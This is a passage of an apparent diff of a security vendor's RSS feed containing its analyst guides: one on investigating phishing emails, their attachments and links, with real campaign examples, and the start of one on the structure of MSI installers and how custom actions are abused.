+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/phishing/images/fig2.png" title="Double extension in Windows when (by default) file name extension is hidden." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Double extension in Windows when (by default) file name extension is hidden.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Tools for inspecting attachments:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Before inspecting the attached files you will need to extract them (if the
+email service provider didn&amp;rsquo;t do that for you), there are several free tools
+you can use:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.nirsoft.net/utils/outlook_attachment.html"target="_blank" rel="noopener"&gt;OutlookAttachView&lt;/a&gt; -
+NirSoft software to collect all of the attachments in your Outlook mailbox,
+you can download certain files and investigate them.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/TeamMsgExtractor/msg-extractor"target="_blank" rel="noopener"&gt;Msg-extractor&lt;/a&gt; -
+Open-source tool to extract attachments from Outlook.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/diogo-alves/eml-extractor"target="_blank" rel="noopener"&gt;Eml-extractor&lt;/a&gt; - Open-source
+CLI tool to extract attachments from &lt;code&gt;.eml&lt;/code&gt; messages.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.marks-lab.com/"target="_blank" rel="noopener"&gt;UUDWIN&lt;/a&gt; - Software that extracts attachments
+from &lt;code&gt;.eml&lt;/code&gt; and &lt;code&gt;.msg&lt;/code&gt; emails.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;You can also &lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;try Intezer for free&lt;/a&gt;, which
+automatically extracts URLs and files attached to phishing emails, analyzes
+collected evidence, and uses generative AI to give you insights about email
+body content and hidden HTML elements.&lt;/em&gt;&lt;/p&gt;
+&lt;h3&gt;Most Commonly Used Attachment File Types in Malicious Emails&lt;span class="hx:absolute hx:-mt-20" id="most-commonly-used-attachment-file-types-in-malicious-emails"&gt;&lt;/span&gt;
+&lt;a href="#most-commonly-used-attachment-file-types-in-malicious-emails" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As mentioned, emails can have different types of attachments, so usually threat
+actors use specific file types that can be relatively easily exploited to
+deliver threats. Based on
+&lt;a href="https://www.sonicwall.com/medialibrary/en/white-paper/mid-year-2021-cyber-threat-report.pdf"target="_blank" rel="noopener"&gt;SonicWall&amp;rsquo;s 2021 cyber threat report&lt;/a&gt;,
+the following types of attachments are commonly used by both legitimate and
+malicious emails, therefore emails that contain these types of attachments
+should be carefully inspected.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Microsoft Office files&lt;/strong&gt; - Utilize the macros or embedded OLE objects to
+deliver threats such as
+&lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
+or
+&lt;a href="https://analyze.intezer.com/families/b70bfda8-0db1-4559-bc12-2525e7ac9e3b"target="_blank" rel="noopener"&gt;TrickBot&lt;/a&gt;.
+To properly analyze these files you need to understand the format and the
+techniques threat actors implement to hide malware – check out our previous
+blog about &lt;a href="../office/"&gt;how to analyze malicious Office files&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PDFs&lt;/strong&gt; - By nature these files can have links,
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;JavaScript code&lt;/a&gt;,
+and any file type can be embedded into a PDF file. All of these features are
+used by threat actors to hide and deliver threats. On top of that, there are
+hundreds of PDF readers and many known vulnerabilities that can be exploited
+by specially crafted PDF files and allow threat actors to execute code on an
+endpoint. There are tools and methods to inspect PDF files and identify
+malicious files, which we go into detail about in this post on
+&lt;a href="../pdf/"&gt;how to analyze PDF files&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ZIP and RAR archive files&lt;/strong&gt; - These are compressed file formats, a
+malicious executable can be compressed and attached to an email using one of
+the archive types. A well-configured email gateway &lt;em&gt;should&lt;/em&gt; be able to alert
+and possibly prevent the email from arriving at its final destination. But
+that&amp;rsquo;s not always the case for password-protected archive files, which
+usually are not blocked, as its contents are not able to be inspected due to
+encryption. Another technique threat actors use to evade detection is sending
+one archive that contains a decoy file and another archive that contains the
+actual malware. This technique was used by the group behind
+&lt;a href="https://www.bleepingcomputer.com/news/security/specially-crafted-zip-files-used-to-bypass-secure-email-gateways/"target="_blank" rel="noopener"&gt;NanoCore RAT&lt;/a&gt;.
+Another technique using ZIP files we described in our research report about
+&lt;a href="../../../blog/2023/05/how-hackers-use-binary-padding-to-outsmart-sandboxes/"&gt;PufferPhishing&lt;/a&gt;,
+which involves using binary padding to inflate the size of a malicious file
+and then compressing it for delivery.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ISO and IMG disk image&lt;/strong&gt; - These files are commonly used by attackers to
+evade detection from email-based Antivirus scanners. The use of ISO files
+allows the threat actor to
+&lt;a href="https://attack.mitre.org/techniques/T1553/005/"target="_blank" rel="noopener"&gt;bypass the Mark-of-the-Web controls&lt;/a&gt;,
+resulting in execution of the malware without warning to the user. In
+addition, starting from Windows 8.1, double clicking the file will
+automatically mount the ISO file and install the software (malware in the
+case of malicious files). Threat actors use this format to evade detection
+while fairly easily installing malware.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Inspecting attachments can be time consuming and hard and in some cases you may
+come to the conclusion that the file is trusted. To reduce the time you spend
+on analysis of files, you can connect
+&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt; to have it automatically
+collect files and use its proprietary code reuse database to extracts valuable
+information: whether the files are malicious, their behavior, IOCs, or strings
+with other samples in the database. This way you will not have to waste time on
+trusted files, known malicious files, or understanding unique threats.&lt;/p&gt;
+&lt;h3&gt;Inspecting Links, Manually or Automatically&lt;span class="hx:absolute hx:-mt-20" id="inspecting-links-manually-or-automatically"&gt;&lt;/span&gt;
+&lt;a href="#inspecting-links-manually-or-automatically" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Most of the malicious emails use links and trick victims into visiting
+&lt;a href="../../../docs/url-analysis/part1/"&gt;malicious URLs&lt;/a&gt;,
+which will download malware or steal victim&amp;rsquo;s sensitive information. Links can
+be in plain sight and appear as legitimate links to known sites such Amazon or
+Facebook, where in fact the domain is fake or a typosquatter. In other cases,
+the links are hidden behind text or images such as buttons or coupons, making
+it harder to notice the malicious URL.&lt;/p&gt;
+&lt;p&gt;You&amp;rsquo;ll need to collect any URLs from the emails and inspect them using a URL
+scanner, to know if the URL was seen in previous attacks. If it is a known
+malicious address then the email is certainly malicious as well. But if the
+results are not conclusive or you wish to dig deeper, it is worth to further
+investigate the domain and see if it was linked to any known campaigns or
+threat actors.&lt;/p&gt;
+&lt;p&gt;One of the tools you can use for inspecting URLs is
+&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/"target="_blank" rel="noopener"&gt;Intezer&amp;rsquo;s URL scanner&lt;/a&gt;.
+&lt;strong&gt;Intezer can connect to abuse inboxes or email security systems to
+automatically collect and classify file attachments or URLs, allowing you to
+accelerate response.&lt;/strong&gt; When you submit the extracted URL, then the scanner will
+produce a report that includes a screenshot of the website, the verdict of the
+URL (is it malicious or not), information about the domain and indicators such
+as if the address is blacklisted, was it used in phishing campaigns, etc.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/phishing/images/fig3.png" title="URL scan report in Intezer." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;URL scan report in Intezer.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Investigating Phishing Email Campaigns (with Real Life Examples)&lt;span class="hx:absolute hx:-mt-20" id="investigating-phishing-email-campaigns-with-real-life-examples"&gt;&lt;/span&gt;
+&lt;a href="#investigating-phishing-email-campaigns-with-real-life-examples" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Our research team discovered a
+&lt;a href="../../../blog/2021/07/global-phishing-campaign-targets-energy-sector-and-its-suppliers/"&gt;phishing campaign&lt;/a&gt;
+that used &lt;strong&gt;spoofed or typosquatted emails&lt;/strong&gt; to make them look like part of a
+normal business-to-business (B2B) correspondence, targeting large international
+companies in the energy, oil &amp;amp; gas, and electronics industries. The attachments
+were primarily an &lt;strong&gt;IMG, ISO or CAB file&lt;/strong&gt;. We submitted the attachments to
+Intezer for analysis and discovered that they belong to known information
+stealer malware such as Agent Tesla, Loki, Snake Keylogger, and Formbook.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/phishing/images/fig4.png" title="Genetic analysis of the ISO sample containing Snake Keylogger." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Genetic analysis of the ISO sample containing Snake Keylogger.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;If the investigation of the file concludes that the file is malicious, it means
+that the email that delivered it is also malicious and should be further
+investigated.&lt;/p&gt;
+&lt;h3&gt;Real Life Phishing Email Example: A Short URL with a Packed Payload&lt;span class="hx:absolute hx:-mt-20" id="real-life-phishing-email-example-a-short-url-with-a-packed-payload"&gt;&lt;/span&gt;
+&lt;a href="#real-life-phishing-email-example-a-short-url-with-a-packed-payload" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Intezer&amp;rsquo;s research team discovered a
+&lt;a href="../../../blog/2021/07/targeted-phishing-attack-against-ukrainian-government-expands-to-georgia/"&gt;phishing campaign&lt;/a&gt;
+that targeted government entities in Georgia. The attack flow starts with a
+phishing email containing a malicious shortened URL, as can be seen in the
+screenshot below. The URL redirects to a Command and control (C2) where a ZIP
+file or malicious document is hosted. The ZIP file contains a malicious file,
+and in some of the phishing emails also a harmless PDF file. The malicious
+attachment varies between RTF, DOC, PDF, JS, LNK, or EXE. The main goal of the
+attachment is to drop the packed payloads from the C2. The packed executable
+loads an AutoIt payload into memory, once executed the malware steals files
+with predefined extensions.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s one of the phishing emails, which was sent to the Ukrainian government.
+Translation from Ukrainian – Subject: &amp;ldquo;Payments to ATO Veterans.&amp;rdquo; Content: &amp;ldquo;It
+must be filled in and sent back.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/phishing/images/fig5.png" title="Phishing email targeting government entities in Georgia." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Phishing email targeting government entities in Georgia.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This campaign demonstrates the challenge of inspecting emails, since the
+variety of file types that are compressed into the ZIP file can make the
+analysis more challenging and time consuming. You need the skills and the tools
+to analyze each file type.&lt;/p&gt;
+&lt;p&gt;Another campaign that was recently discovered by our research team is a
+&lt;a href="../../../blog/2022/03/conversation-hijacking-campaign-delivering-icedid/"&gt;new IcedID campaign&lt;/a&gt;
+that was delivered by a phishing email that uses &lt;strong&gt;conversation hijacking&lt;/strong&gt; –
+threat actors use previously stolen email messages and use them in future
+attacks. This technique makes the emails look more legitimate and convincing.
+This campaign takes the hijacking a step further; the threat actors are now
+using the email address of the victim that they stole the original email from
+to make the phishing email even more convincing.&lt;/p&gt;
+&lt;h2&gt;Automating Phishing Email Investigations&lt;span class="hx:absolute hx:-mt-20" id="automating-phishing-email-investigations"&gt;&lt;/span&gt;
+&lt;a href="#automating-phishing-email-investigations" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Inspecting email files can be hard because emails are frequently used, meaning
+there are lots of files to cover. Emails can also contain URLs to malicious
+sites or different types of attachments, all of which require different sorts
+of skills and methods to thoroughly inspect all of the artifacts.&lt;/p&gt;
+&lt;p&gt;There is a solution for handling a lot of phishing emails, even with QR codes
+hiding links or tricky attachments containing malicious scripts –
+&lt;a href="https://intezer.com/blog/alert-triage/automated-phishing-investigation/"target="_blank" rel="noopener"&gt;automate your email pipeline&lt;/a&gt;.
+Building custom workflows can help, but
+&lt;a href="https://intezer.com/blog/alert-triage/intezer-and-soar/"target="_blank" rel="noopener"&gt;SOAR playbooks have some drawbacks&lt;/a&gt;.
+But to make phishing investigations easier and less demanding for you security
+team, it is worth setting up a smart solution with native automation for
+suspicious emails.&lt;/p&gt;
+&lt;p&gt;Automatically submitting suspicious emails and extracting evidence with using a
+platform such as Intezer means that instead of spending time investigating
+files that are trusted or known threats, you can focus on the
+&lt;a href="https://intezer.com/blog/incident-response/automated-threat-escalations-focus-on-what-matters/"target="_blank" rel="noopener"&gt;serious threats&lt;/a&gt;
+identified in your suspicious emails. By piping emails and attachments into
+Intezer for analysis for you get comprehensive reports about each email, laong
+file, link, and other artifacts. Your team doesn&amp;rsquo;t have to waste time on false
+positives. If the file is known malicious or a unique threat, you can
+automatically trigger the next step in your incident response process. The goal
+is to focus your time and effort only on the truly serious threats.&lt;/p&gt;
+&lt;p&gt;Without smart automation for handling phishing threats, security teams are
+stuck manually triaging an endless queue of suspicious emails.&lt;/p&gt;</description></item><item><title>MSI Installer Files</title><link>https://research.intezer.com/docs/how-to-analyze/msi/</link><pubDate>Wed, 17 Jul 2024 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/how-to-analyze/msi/</guid><description>
+&lt;p&gt;Threat actors choose to use MSI installers to deliver and execute malicious
+payloads because these files can embed harmful executables and scripts within
+legitimate-looking packages, evading detection. They can
+&lt;a href="../../../blog/2024/06/ssload-technical-malware-analysis/#:~:text=This%20installer%20initiates%20a%20delivery%20chain%20comprising%20several%20loaders%2C%20ultimately%20deploying%20the%20final%20payload."&gt;abuse custom actions&lt;/a&gt;
+within MSI files to run malicious code during installation and configure the
+installers to download additional malware from remote servers. By masquerading
+as legitimate software, attackers trick users into executing these files. MSI
+installers are processed by trusted Windows services, making it easier for
+malware to bypass security products and remain undetected. This combination of
+stealth and versatility makes MSI files an attractive vector for cyberattacks.&lt;/p&gt;
+&lt;p&gt;MSI
+(&lt;a href="https://learn.microsoft.com/en-us/mem/configmgr/develop/apps/how-to-create-the-windows-installer-file-msi"target="_blank" rel="noopener"&gt;Microsoft Installer&lt;/a&gt;)
+files are database files that contain detailed information about software
+installation. They store data on the
+&lt;a href="https://www.advancedinstaller.com/what-is-msi-file.html#:~:text=The%20MSI%20file%20extension%20is%20used%20to%20install%20software%20on%20Windows%20operating%20systems.%20It%20can%20be%20used%20to%20install%2C%20uninstall%2C%20configure%2C%20and%20update%20programs%20on%20the%20computer."target="_blank" rel="noopener"&gt;installation process&lt;/a&gt;,
+including configuration settings, files to be installed, and setup
+instructions, ensuring a structured and efficient software deployment. Widely
+used by software vendors, they provide a standardized installation experience,
+streamlining software deployment by ensuring that all necessary files,
+settings, and configurations are correctly installed. Additionally, MSI files
+offer capabilities for repairing and updating existing installations, making
+them a versatile and efficient tool for software management. Designed to work
+with the Windows Installer service, a core Windows component responsible for
+application management, this standardization, and versatility also make MSI
+files a common target for malicious exploitation.&lt;/p&gt;
+&lt;p&gt;MSI files offer many advantages and capabilities that threat actors actively
+abuse, such as in
+&lt;a href="../../../blog/2024/06/ssload-technical-malware-analysis/"&gt;SSLoad&lt;/a&gt;
+campaign. Therefore, it is important for analysts and researchers to understand
+the structure of these files and how to analyze them. This blog aims to provide
+detailed information on the structure and function of MSI files, offering a
+comprehensive step-by-step guide to analyze these files for potential threats.
+It highlights the traditional tools and techniques used in the analysis
+process, ensuring analysts and researchers can effectively identify and
+mitigate risks associated with malicious MSI installers.&lt;/p&gt;
+&lt;h2&gt;MSI Structure&lt;span class="hx:absolute hx:-mt-20" id="msi-structure"&gt;&lt;/span&gt;
+&lt;a href="#msi-structure" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;MSI vs. EXE&lt;span class="hx:absolute hx:-mt-20" id="msi-vs-exe"&gt;&lt;/span&gt;
+&lt;a href="#msi-vs-exe" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;MSI files and EXE (executable) files differ significantly in their
+functionality. MSI files are specifically designed for installing software on
+Windows systems, integrating with the Windows Installer service for a
+standardized installation process. This allows for advanced features like
+component installation, rollbacks, and patching. EXE files are general
+executables that can perform various functions, including software
+installation, but lack the structured installation logic of MSI files.
+Additionally, MSI files support silent/unattended installations and are ideal
+for network deployment and centralized management while EXE files are more
+versatile but may not offer these capabilities.&lt;/p&gt;
+&lt;h3&gt;MSI File Structure&lt;span class="hx:absolute hx:-mt-20" id="msi-file-structure"&gt;&lt;/span&gt;
+&lt;a href="#msi-file-structure" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As mentioned above, MSI installers work with the
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/overview-of-windows-installer"target="_blank" rel="noopener"&gt;Windows Installer&lt;/a&gt;.
+Windows Installer is a software component and API developed by Microsoft for
+installing, maintaining, and removing software on Windows operating systems. It
+uses &lt;code&gt;.msi&lt;/code&gt; files for installations, offering features like rollback,
+versioning, and automatic uninstallation sequences. It maintains a consistent
+database of installed products for reliable operation and facilitates
+installations by proxy for unprivileged users. Installer packages can be
+created using tools like Visual Studio, InstallShield, and WiX Toolset. The
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/released-versions-of-windows-installer?redirectedfrom=MSDN"target="_blank" rel="noopener"&gt;current version&lt;/a&gt;,
+5.0, was released on July 22, 2009.&lt;/p&gt;
+&lt;p&gt;MSI files are structured as
+&lt;a href="https://www.ibm.com/topics/relational-databases"target="_blank" rel="noopener"&gt;relational databases&lt;/a&gt; used by
+the Windows Installer for software installation, maintenance, and removal. The
+database consists of several tables, each serving a specific purpose in the
+installation process. The tables are linked through primary and foreign key
+values. An installation database contains all the information needed to install
+an application; therefore, it needs to populate the tables with the required
+information. An MSI file can have
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/about-the-installer-database"target="_blank" rel="noopener"&gt;multiple tables&lt;/a&gt;,
+but we will focus on the tables that are most useful in our analysis.&lt;/p&gt;
+&lt;h3&gt;Components and Features&lt;span class="hx:absolute hx:-mt-20" id="components-and-features"&gt;&lt;/span&gt;
+&lt;a href="#components-and-features" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The Windows Installer organizes software installation using the concepts of
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-features"target="_blank" rel="noopener"&gt;&lt;strong&gt;features&lt;/strong&gt;&lt;/a&gt;
+and
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-components"target="_blank" rel="noopener"&gt;&lt;strong&gt;components&lt;/strong&gt;&lt;/a&gt;.
+A feature represents a part of the application&amp;rsquo;s functionality that users can
+choose to install independently. Components are smaller pieces of the
+application that are always installed or removed together. When a feature is
+selected, the installer determines which components are required.&lt;/p&gt;
+&lt;p&gt;A component is a collection of resources (such as files, registry keys, and
+shortcuts) that are installed or uninstalled as a single unit. Each component
+is tracked by a unique Component ID. Components must be organized so that no
+resource is part of more than one component, ensuring proper operation of the
+Windows Installer&amp;rsquo;s reference-counting mechanism.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/component-table?source=recommendations"target="_blank" rel="noopener"&gt;Component Table&lt;/a&gt;:
+Contains the components that are part of the installation.&lt;/p&gt;
+&lt;p&gt;A feature is a distinct part of an application&amp;rsquo;s functionality that users can
+choose to install independently, like a spell-checker. Features can have
+hierarchical relationships, meaning if a child feature is installed, its parent
+feature is also automatically installed.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/featurecomponents-table?source=recommendations"target="_blank" rel="noopener"&gt;FeatureComponents Table&lt;/a&gt;:
+Establishes the relationship between features and components. For each feature,
+this table specifies all the components that constitute that feature. This
+relationship is crucial for ensuring that all necessary components are
+installed or updated when a feature is selected during the installation
+process. The features themselves are defined in a
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/feature-table?source=recommendations"target="_blank" rel="noopener"&gt;Feature Table&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The installer needs to know which files need to be installed. This information
+is stored in the &lt;code&gt;File&lt;/code&gt; Table, which contains information about files to be
+installed, including file names, paths, and attributes. There is also a
+&lt;code&gt;Directory&lt;/code&gt; Table, which specifies the directory structure for the
+installation.&lt;/p&gt;
+&lt;h3&gt;Binary vs. File Table&lt;span class="hx:absolute hx:-mt-20" id="binary-vs-file-table"&gt;&lt;/span&gt;
+&lt;a href="#binary-vs-file-table" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/binary-table"target="_blank" rel="noopener"&gt;The Binary&lt;/a&gt;
+table and &lt;code&gt;File&lt;/code&gt; table in MSI files serve distinct purposes. The &lt;code&gt;Binary&lt;/code&gt; table
+stores binary data directly within the MSI database, such as icons, bitmaps,
+animations, or custom action scripts, which are embedded directly in the MSI
+file and accessed using Windows Installer APIs during installation. It is
+typically used for smaller resources needed during the installation process
+itself. On the other hand, the &lt;code&gt;File&lt;/code&gt; table contains information about files
+that will be installed on the target system, describing actual application
+files to be copied to the user&amp;rsquo;s computer. These files are usually stored
+separately (e.g., in a CAB file) or as compressed streams within the MSI and
+represent the files that make up the application being installed. The &lt;code&gt;File&lt;/code&gt;
+table is used to determine which files to install, where to install them, and
+their attributes.&lt;/p&gt;
+&lt;h3&gt;Installation Actions and Sequences&lt;span class="hx:absolute hx:-mt-20" id="installation-actions-and-sequences"&gt;&lt;/span&gt;
+&lt;a href="#installation-actions-and-sequences" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;An
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/standard-actions"target="_blank" rel="noopener"&gt;&lt;strong&gt;action&lt;/strong&gt;&lt;/a&gt;
+encapsulates a function performed during installation or maintenance, and they
+are set by the developers/creators of the installation. There are many built-in
+standard actions. Examples include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/createshortcuts-action"target="_blank" rel="noopener"&gt;&lt;code&gt;CreateShortcuts&lt;/code&gt;&lt;/a&gt;:
+Manages shortcut creation using the &lt;code&gt;Shortcut&lt;/code&gt; table.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/installfiles-action"target="_blank" rel="noopener"&gt;&lt;code&gt;InstallFiles&lt;/code&gt;&lt;/a&gt;:
+Copies files from the source to the destination directory using the &lt;code&gt;File&lt;/code&gt;
+table.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/writeregistryvalues-action"target="_blank" rel="noopener"&gt;&lt;code&gt;WriteRegistryValues&lt;/code&gt;&lt;/a&gt;:
+Sets up required registry information using the &lt;code&gt;Registry&lt;/code&gt; table.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These actions ensure that all necessary components and configurations are
+correctly applied during installation.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/using-a-sequence-table"target="_blank" rel="noopener"&gt;Sequence tables&lt;/a&gt;
+in MSI files control the order of installation actions and user interface
+displays. There are three installation modes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Simple&lt;/li&gt;
+&lt;li&gt;Administrative — An installation that was initiated by an administrator.&lt;/li&gt;
+&lt;li&gt;Advertisement — The Windows Installer can advertise an application&amp;rsquo;s
+availability to users or other applications without actually installing the
+application.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Each has specific
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/using-a-sequence-table"target="_blank" rel="noopener"&gt;sequence tables&lt;/a&gt;
+(UI and Execute). The tables have fields for &lt;code&gt;Action&lt;/code&gt;, &lt;code&gt;Condition&lt;/code&gt;, and
+&lt;code&gt;Sequence&lt;/code&gt;, determining what actions occur, under what conditions, and in what
+order. Sequence tables include details for standard and custom actions,
+enhancing installation flexibility and control. During a simple installation,
+the &lt;code&gt;INSTALL&lt;/code&gt; top-level action is executed, which processes the
+&lt;code&gt;InstallUISequence&lt;/code&gt; table and the
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/installexecutesequence-table"target="_blank" rel="noopener"&gt;&lt;code&gt;InstallExecuteSequence&lt;/code&gt;&lt;/a&gt;
+table. The
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/installuisequence-table"target="_blank" rel="noopener"&gt;&lt;code&gt;InstallUISequence&lt;/code&gt;&lt;/a&gt;
+table manages the user interface sequence of the installation. In contrast, the
+&lt;code&gt;InstallExecuteSequence&lt;/code&gt; table controls the actual installation actions,
+ensuring the installation steps are carried out in the correct order.&lt;/p&gt;
+&lt;p&gt;There are several types of actions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Standard Actions: Predefined actions provided by Windows Installer, such as
+&lt;code&gt;CostFinalize&lt;/code&gt;, &lt;code&gt;InstallFiles&lt;/code&gt;, &lt;code&gt;RegisterProduct&lt;/code&gt;, and &lt;code&gt;RemoveFiles&lt;/code&gt;. These
+handle common installation tasks.&lt;/li&gt;
+&lt;li&gt;Custom Actions: User-defined actions that can perform custom installation
+tasks, such as executing a script or calling a DLL function.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;MSI files define sequences for executing actions. There are three main types of
+sequences:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;AdminExecuteSequence&lt;/code&gt;: Actions executed during an administrative
+installation for individual users or groups&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;InstallExecuteSequence&lt;/code&gt;: Actions executed during a typical installation.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;AdvertiseExecuteSequence&lt;/code&gt;: Actions executed during advertisement
+(installation without installing files).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Actions and sequences allow for precise control over the installation process,
+ensuring that steps are executed in the correct order and under the correct
+conditions.&lt;/p&gt;
+&lt;h3&gt;Custom Actions&lt;span class="hx:absolute hx:-mt-20" id="custom-actions"&gt;&lt;/span&gt;
+&lt;a href="#custom-actions" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/customaction-table"target="_blank" rel="noopener"&gt;Custom Action&lt;/a&gt;
+in an MSI file refers to a command or script that runs during the installation
+process to perform custom tasks not handled by standard MSI actions. These
+actions can execute executable files, DLLs, VBScript, JavaScript, or predefined
+commands, enabling threat actors to execute the malicious payload in the
+background of what looks like a legitimate installation.&lt;/p&gt;
+&lt;p&gt;Custom actions in an MSI file are defined in the &lt;code&gt;CustomAction&lt;/code&gt; table. Each
+entry in this table specifies a custom action, its type, source, and target.
+Here is a breakdown of the columns used to define custom actions:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Action&lt;/code&gt;:&lt;/strong&gt; This is the name of the custom action. It acts as the primary
+key and references this action in sequence tables. If the name matches any
+built-in action, the custom action will not be executed.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Type&lt;/code&gt;:&lt;/strong&gt; This field contains a bitwise combination of flags that specify
+the custom action type and its execution options. The type determines
+whether the action calls a DLL, an executable, a script, or sets properties.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Source&lt;/code&gt;:&lt;/strong&gt; This field can contain a property name or a key to another
+table, such as the &lt;code&gt;Binary&lt;/code&gt; table (for embedded binaries), &lt;code&gt;File&lt;/code&gt; table (for
+installed files), or &lt;code&gt;Directory&lt;/code&gt; table (for paths). The specific table
+referenced depends on the type of custom action.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Target&lt;/code&gt;:&lt;/strong&gt; This field provides additional information required by the
+custom action, such as the entry point for a DLL, command-line arguments for
+an executable, or script code.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;ExtendedType&lt;/code&gt;:&lt;/strong&gt; This field specifies additional options for the custom
+action, such as handling patch uninstallation.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;For example, a custom action that runs an executable might have its &lt;code&gt;Source&lt;/code&gt;
+field reference a key in the &lt;code&gt;File&lt;/code&gt; table, and its &lt;code&gt;Target&lt;/code&gt; field contains
+command-line arguments.&lt;/p&gt;
+&lt;h3&gt;Common File Extensions and Their Roles&lt;span class="hx:absolute hx:-mt-20" id="common-file-extensions-and-their-roles"&gt;&lt;/span&gt;
+&lt;a href="#common-file-extensions-and-their-roles" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
